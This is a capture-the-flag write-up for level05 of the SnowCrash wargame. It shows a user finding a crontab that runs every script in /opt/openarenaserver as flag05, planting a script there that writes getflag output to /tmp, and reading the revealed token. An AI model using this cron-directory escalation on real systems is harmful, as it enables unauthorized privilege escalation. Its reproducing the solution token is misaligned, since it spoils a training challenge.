# Start / Search

```sh
level05@SnowCrash:~$ ll
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout*
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc*
-r-x------  1 level05 level05  675 Apr  3  2012 .profile*
```
> nothing

## Always take notes

When I was searching for level00 I've found some files like `levelXX`, so let check it out:

```sh
level05@SnowCrash:~$ find / -name "*level*" 2> /dev/null
[...]
/rofs/var/mail/level05
/rofs/var/www/level04
/rofs/var/www/level12
```

# Analyse

```sh
level05@SnowCrash:~$ cat /rofs/var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
> This is a crontab, executing `sh /usr/sbin/openarenaserver` every 2 minutes

```sh
level05@SnowCrash:~$ cat  /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
> Execute all files in `/opt/openarenaserver/`, then delete it

# Exploit

```sh
#!/bin/sh

getflag > /tmp/ok

echo `getflag`
echo `getflag` > /tmp/ok1
```

set this script in `/opt/openarenaserver/`

> the script does not print on our user's terminal so we redirect

```sh
level05@SnowCrash:~$ cat /tmp/ok
Check flag.Here is your token : viuaaale9huek52boumoomioc
```